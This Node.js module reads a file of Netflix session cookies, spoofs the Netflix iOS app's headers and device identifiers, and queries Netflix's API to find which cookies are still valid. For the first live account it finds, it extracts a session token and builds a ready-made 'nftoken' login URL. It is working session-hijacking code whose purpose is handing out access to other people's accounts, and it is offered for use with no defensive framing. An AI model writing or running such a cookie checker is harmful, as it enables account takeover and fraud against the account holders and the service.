const fs = require('fs').promises;
const path = require('path');
const https = require('https');
const { URL } = require('url');

const API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48";

const QUERY_PARAMS = {
  appVersion: "15.48.1",
  config: '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
  device_type: "NFAPPL-02-",
  esn: "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
  idiom: "phone",
  iosVersion: "15.8.5",
  isTablet: "false",
  languages: "en-US",
  locale: "en-US",
  maxDeviceWidth: "375",
  model: "saget",
  modelType: "IPHONE8-1",
  odpAware: "true",
  path: '["account","token","default"]',
  pathFormat: "graph",
  pixelDensity: "2.0",
  progressive: "false",
  responseFormat: "json",
};

const BASE_HEADERS = {
  "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
  "x-netflix.request.attempt": "1",
  "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
  "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
  "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
  "x-netflix.context.app-version": "15.48.1",
  "x-netflix.argo.translated": "true",
  "x-netflix.context.form-factor": "phone",
  "x-netflix.context.sdk-version": "2012.4",
  "x-netflix.client.appversion": "15.48.1",
  "x-netflix.context.max-device-width": "375",
  "x-netflix.context.ab-tests": "",
  "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
  "x-netflix.client.type": "argo",
  "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
  "x-netflix.context.locales": "en-US",
  "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
  "x-netflix.client.iosversion": "15.8.5",
  "accept-language": "en-US;q=1",
  "x-netflix.argo.abtests": "",
  "x-netflix.context.os-version": "15.8.5",
  "x-netflix.request.client.context": '{"appState":"foreground"}',
  "x-netflix.context.ui-flavor": "argo",
  "x-netflix.argo.nfnsm": "9",
  "x-netflix.context.pixel-density": "2.0",
  "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
  "x-netflix.request.client.timezoneid": "Asia/Dhaka",
};

function makeRequest(url, options, postData = null) {
  return new Promise((resolve, reject) => {
    const urlObj = new URL(url);
    const requestOptions = {
      hostname: urlObj.hostname,
      port: urlObj.port || 443,
      path: urlObj.pathname + urlObj.search,
      method: options.method || 'GET',
      headers: options.headers || {},
      timeout: 10000,
    };

    const req = https.request(requestOptions, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        if (data.trim().startsWith('<')) {
          reject(new Error('Netflix API is currently unavailable'));
          return;
        }
        
        try {
          const parsed = JSON.parse(data);
          resolve(parsed);
        } catch (e) {
          reject(new Error('Invalid API response'));
        }
      });
    });

    req.on('error', reject);
    req.on('timeout', () => {
      req.destroy();
      reject(new Error('Request timeout'));
    });
    
    if (postData) req.write(postData);
    req.end();
  });
}

function extractNetflixIdFromLine(line) {
  const netflixIdEqMatch = line.match(/NetflixId=([^;.\n]+)/);
  if (netflixIdEqMatch) {
    let value = netflixIdEqMatch[1];
    try { value = decodeURIComponent(value); } catch(e) {}
    return value;
  }
  
  const netflixIdColonMatch = line.match(/NetflixId:([^;]+)/);
  if (netflixIdColonMatch) return netflixIdColonMatch[1];
  
  return null;
}

function extractAllCookies(line) {
  const cookies = { NetflixId: null, SecureNetflixId: null, nfvdid: null };
  
  let netflixMatch = line.match(/NetflixId=([^;.\n]+)/);
  if (!netflixMatch) netflixMatch = line.match(/NetflixId:([^;]+)/);
  if (netflixMatch) {
    let value = netflixMatch[1];
    try { value = decodeURIComponent(value); } catch(e) {}
    cookies.NetflixId = value;
  }
  
  const secureMatch = line.match(/SecureNetflixId[=:]([^;]+)/);
  if (secureMatch) cookies.SecureNetflixId = secureMatch[1];
  
  const nfvdidMatch = line.match(/nfvdid[=:]([^;]+)/);
  if (nfvdidMatch) cookies.nfvdid = nfvdidMatch[1];
  
  return cookies;
}

async function readAccountsFromFile() {
  const possiblePaths = [
    path.join(__dirname, '..', 'public', 'Acccounts', 'accs.txt'),
    path.join(process.cwd(), 'public', 'Acccounts', 'accs.txt'),
    path.join(process.cwd(), 'accs.txt'),
  ];
  
  let fileContent = null;
  
  for (const testPath of possiblePaths) {
    try {
      await fs.access(testPath);
      console.log(`✅ Found Netflix accounts at: ${testPath}`);
      fileContent = await fs.readFile(testPath, 'utf-8');
      break;
    } catch (err) {
      continue;
    }
  }
  
  if (!fileContent) {
    throw new Error('Netflix accounts file not found');
  }
  
  let accounts = fileContent.split(/\r?\n/).filter(acc => acc.trim().length > 0);
  accounts = accounts.map(acc => acc.trim());
  
  console.log(`📚 Loaded ${accounts.length} Netflix accounts`);
  
  if (accounts.length === 0) {
    throw new Error('No valid accounts found');
  }
  
  return accounts;
}

async function getNetflixAccountCount() {
  try {
    const accounts = await readAccountsFromFile();
    return accounts.length;
  } catch (error) {
    return 0;
  }
}

async function testCookie(netflixId, secureNetflixId = null, nfvdid = null) {
  const headers = { ...BASE_HEADERS };
  
  let cookieString = `NetflixId=${encodeURIComponent(netflixId)}`;
  if (secureNetflixId) cookieString += `; SecureNetflixId=${secureNetflixId}`;
  if (nfvdid) cookieString += `; nfvdid=${nfvdid}`;
  
  headers.Cookie = cookieString;
  
  const url = `${API_URL}?${new URLSearchParams(QUERY_PARAMS).toString()}`;
  
  const response = await makeRequest(url, { method: 'GET', headers });
  
  const tokenData = response?.value?.account?.token?.default || {};
  const token = tokenData.token;
  const expires = tokenData.expires;
  
  if (!token) {
    throw new Error('No token found in response');
  }
  
  const currentTime = Date.now();
  const isExpired = expires && currentTime > expires;
  
  return {
    success: true,
    netflixId: netflixId,
    token: token,
    expires: expires,
    isExpired: isExpired,
    loginUrl: `https://netflix.com/login?nftoken=${token}`
  };
}

async function getRandomNetflixCookie(selectionMethod = 'smart') {
  const accounts = await readAccountsFromFile();
  
  if (accounts.length === 0) {
    throw new Error('No accounts found in the file');
  }
  
  let accountsToTest = [];
  
  switch(selectionMethod) {
    case 'pure':
      const randomIndex = Math.floor(Math.random() * accounts.length);
      accountsToTest = [accounts[randomIndex]];
      console.log(`🎲 Using PURE RANDOM selection`);
      break;
      
    case 'sequential':
      const startIndex = Math.floor(Math.random() * accounts.length);
      accountsToTest = [...accounts.slice(startIndex), ...accounts.slice(0, startIndex)];
      console.log(`🎲 Using SEQUENTIAL selection`);
      break;
      
    case 'weighted':
      accountsToTest = [...accounts];
      for (let i = accountsToTest.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [accountsToTest[i], accountsToTest[j]] = [accountsToTest[j], accountsToTest[i]];
      }
      console.log(`🎲 Using WEIGHTED selection`);
      break;
      
    case 'smart':
    default:
      accountsToTest = [...accounts];
      for (let i = accountsToTest.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [accountsToTest[i], accountsToTest[j]] = [accountsToTest[j], accountsToTest[i]];
      }
      console.log(`🎲 Using SMART selection`);
      break;
  }
  
  let attempts = 0;
  let lastError = null;
  
  for (const account of accountsToTest) {
    attempts++;
    
    const allCookies = extractAllCookies(account);
    let netflixId = allCookies.NetflixId;
    
    if (!netflixId) {
      netflixId = extractNetflixIdFromLine(account);
    }
    
    if (!netflixId) {
      console.log(`❌ Attempt ${attempts}: No NetflixId found`);
      continue;
    }
    
    try {
      console.log(`🎬 Attempt ${attempts}/${accountsToTest.length}: Testing account...`);
      
      const result = await testCookie(
        netflixId, 
        allCookies.SecureNetflixId, 
        allCookies.nfvdid
      );
      
      if (!result.isExpired && result.token) {
        console.log(`✅ Working Netflix account found!`);
        
        return {
          success: true,
          attempts: attempts,
          totalAccounts: accounts.length,
          selectionMethod: selectionMethod,
          data: {
            loginUrl: result.loginUrl,
            token: result.token,
            expires: result.expires ? new Date(result.expires).toLocaleString() : 'Unknown'
          }
        };
      } else {
        console.log(`⚠️ Attempt ${attempts}: Cookie expired`);
        lastError = 'Cookie expired';
      }
    } catch (error) {
      console.log(`❌ Attempt ${attempts}: ${error.message}`);
      lastError = error.message;
    }
    
    await new Promise(resolve => setTimeout(resolve, 500));
  }
  
  throw new Error(`No working Netflix cookies found. Tested ${attempts} accounts. Last error: ${lastError}`);
}

module.exports = { getRandomNetflixCookie, getNetflixAccountCount };